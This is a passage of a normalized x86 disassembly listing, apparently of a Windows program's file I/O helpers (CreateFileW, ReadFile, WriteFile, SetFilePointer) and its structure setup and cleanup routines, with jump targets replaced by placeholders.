mov edx [ ebp - 0xa0 ]
cmp edx [ ebp - 0x48 ]
jne r-xdata
mov eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x54 ] eax
mov ecx [ ebp - 0x54 ]
cmp [ ecx + 0x8 ] 0x21
jne r-xdata
mov ecx [ ebp - 0x58 ]
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0xa4 ]
je r-xdata
mov ecx [ ebp + 0x20 ]
sub ecx [ ebp - 0x28 ]
add ecx [ ebp + 0x1c ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x88 ] edx
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x80 ] ecx
jmp r-xdata
ja r-xdata
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x24 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax 0x4
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebp + 0x20 ]
push eax
mov ecx [ ebp + 0x1c ]
push ecx
call sub_406eb0
add esp 0x10
jmp r-xdata
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x9c ]
cmp eax [ ebp - 0x44 ]
je r-xdata
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0x54 ]
cmp [ edx + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0x24 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
call sub_401340
add esp 0x1c
mov [ ebp - 0x7c ] eax
cmp [ ebp - 0x7c ] 0x0
je r-xdata
mov ecx [ ebp - 0x18 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
call sub_401710
add esp 0x10
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov eax 0x5
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0xb0 ]
jbe r-xdata
mov eax 0x1
sub eax [ ebp - 0xc ]
mov ecx [ ebp + 0x28 ]
mov edx [ ebp - 0x34 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x18 ] eax
mov ecx 0x1
sub ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov [ ebp + ecx * 4 - 0x40 ] edx
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov ecx 0x4
shl ecx 0x1
mov edx [ ebp + ecx - 0x40 ]
push edx
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x24 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx 0x4
shl ecx 0x1
mov edx [ ebp + 0x28 ]
mov [ edx + ecx ] eax
mov eax 0x4
shl eax 0x1
mov ecx [ ebp + 0x28 ]
cmp [ ecx + eax ] 0x0
jne r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0x18 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
mov edx [ ebp - 0x20 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
call sub_401520
add esp 0x1c
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x70 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x7c ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x50 ]
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax 0x4
shl eax 0x1
mov ecx [ ebp + 0x28 ]
mov edx [ ecx + eax ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x44 ]
push ecx
mov edx [ ebp - 0x48 ]
push edx
call sub_401710
add esp 0x10
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x68 ] eax
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov edx 0x4
shl edx 0x1
cmp [ ebp + edx - 0x40 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x20 ]
push ecx
mov edx [ ebp + 0x1c ]
push edx
mov eax 0x4
shl eax 0x1
mov ecx [ ebp + eax - 0x40 ]
push ecx
mov edx 0x4
shl edx 0x1
mov eax [ ebp + 0x28 ]
mov ecx [ eax + edx ]
push ecx
mov edx 0x4
shl edx 0x0
mov eax [ ebp + edx - 0x40 ]
push eax
mov ecx 0x4
shl ecx 0x0
mov edx [ ebp + 0x28 ]
mov eax [ edx + ecx ]
push eax
mov ecx 0x4
imul ecx ecx 0x0
mov edx [ ebp + ecx - 0x40 ]
push edx
mov eax 0x4
imul eax eax 0x0
mov ecx [ ebp + 0x28 ]
mov edx [ ecx + eax ]
push edx
mov eax [ ebp - 0x80 ]
push eax
mov ecx [ ebp - 0x88 ]
push ecx
call sub_406920
add esp 0x28
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x74 ] edx
cmp [ ebp - 0x74 ] 0x0
je r-xdata
mov eax [ ebp - 0x68 ]
jmp r-xdata
mov eax 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x74 ]
jmp r-xdata
sub_4021e0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x24 ]
push ecx
mov edx [ ebp + 0x20 ]
push edx
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_401be0
add esp 0x24
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
cmp [ ebp - 0x14 ] 0x3
jge r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + ecx * 4 - 0x10 ]
push edx
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x24 ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
sub_402280
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
mov [ ebp - 0x8 ] 0x80000000
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
push 0x0
push 0x80
mov eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x1
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call [ CreateFileW@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0xffffffff
je r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_402340
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xffffffff
je r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xffffffff
call [ GetLastError@IAT ]
jmp r-xdata
pop ebp
retn
sub_402370
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ edx ] 0x0
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x10 ] __dos_header
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] 0x0
push 0x0
lea edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call [ ReadFile@IAT ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0x8 ]
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
add ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
ja r-xdata
jmp r-xdata
cmp [ ebp - 0xc ] __dos_header
jbe r-xdata
xor eax eax
sub_402430
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ edx ] 0x0
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x10 ] __dos_header
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] 0x0
push 0x0
lea edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call [ WriteFile@IAT ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0x8 ]
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
add ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
ja r-xdata
jmp r-xdata
cmp [ ebp - 0xc ] __dos_header
jbe r-xdata
xor eax eax
sub_4024f0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov edx [ edx + 0x4 ]
mov cl 0x10
call sub_41bd90
mov cl 0x10
call sub_41bd90
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
cmp [ ebp - 0x14 ] 0x1
je r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call [ SetFilePointer@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp [ ebp - 0x14 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
cdq
mov cl 0x20
call sub_41bd70
xor ecx ecx
or eax [ ebp - 0xc ]
or edx ecx
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
xor eax eax
call [ GetLastError@IAT ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov eax 0x57
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
sub_4025c0
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call sub_402370
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x8
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_402600
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call sub_4024f0
add esp 0xc
mov esp ebp
pop ebp
retn
sub_402670
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
add ecx 0x10
push ecx
call sub_4010d0
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_402650
add esp 0x4
pop ebp
retn
sub_4026a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1c ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24 ] 0x0
pop ebp
retn
sub_402710
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp + 0x8 ]
push eax
call sub_4026a0
add esp 0x4
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jae r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
imul edx edx 0x18
mov eax [ ebp + 0x8 ]
add edx [ eax ]
push edx
call sub_402670
add esp 0x8
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_4027c0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
imul eax eax 0x18
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x8 ]
add ecx [ edx + eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_402810
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x14 ]
jae r-xdata
or eax 0xffffffff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + edx * 8 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_402850
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x14 ]
jae r-xdata
or eax 0xffffffff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + edx * 8 + 0x4 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_4028a0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_4027c0
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp r-xdata
xor eax eax
xor edx edx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov esp ebp
pop ebp
retn
xor eax eax
xor edx edx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_402850
add esp 0x8
test eax eax
jge r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + edx * 8 ]
mov edx [ ecx + edx * 8 + 0x4 ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
sub_402910
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x19 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1a ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1b ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1c ] 0x0
pop ebp
retn
sub_402940
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1c ] 0x0
pop ebp
retn
sub_4029a0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_402940
add esp 0x4
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0x18 ]
jae r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
imul edx edx 0x28
mov eax [ ebp + 0x8 ]
add edx [ eax + 0xc ]
push edx
call sub_402710
add esp 0x8
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_402a70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_402940
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x30 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x34 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x40 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x44
push eax
call sub_401050
add esp 0x4
pop ebp
retn
sub_402ad0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x34 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
add edx 0x44
push edx
call sub_4010d0
add esp 0x8
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4029a0
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_402a70
add esp 0x4
pop ebp
retn
sub_402b80
push ebp
mov ebp esp
sub esp 0x34
push esi
mov [ ebp - 0x10 ] 0x0
xorpd xmm0 xmm0
movlpd [ ebp - 0x34 ] xmm0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
shl eax 0x2
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx ]
call eax
add esp 0x8
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x30 ] edx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x30 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x18 ]
jae r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ ecx + edx * 4 ] eax
mov ecx [ ebp - 0x4 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
mov edx [ ebp - 0x10 ]
add edx [ eax + ecx + 0x18 ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
shl eax 0x3
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx ]
call eax
add esp 0x8
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ ecx + 0x34 ] edx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x34 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x14 ]
jae r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x34 ]
mov [ ecx + edx * 8 ] eax
mov eax [ ebp - 0x30 ]
mov [ ecx + edx * 8 + 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x34 ]
add ecx [ edx + eax * 8 ]
mov esi [ ebp - 0x30 ]
adc esi [ edx + eax * 8 + 0x4 ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] esi
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
shl edx 0x2
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x38 ] ecx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x1c ] 0x0
jne r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x2
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x3c ] ecx
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x3c ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0x1c ]
jae r-xdata
xor eax eax
mov edx [ ebp - 0x4 ]
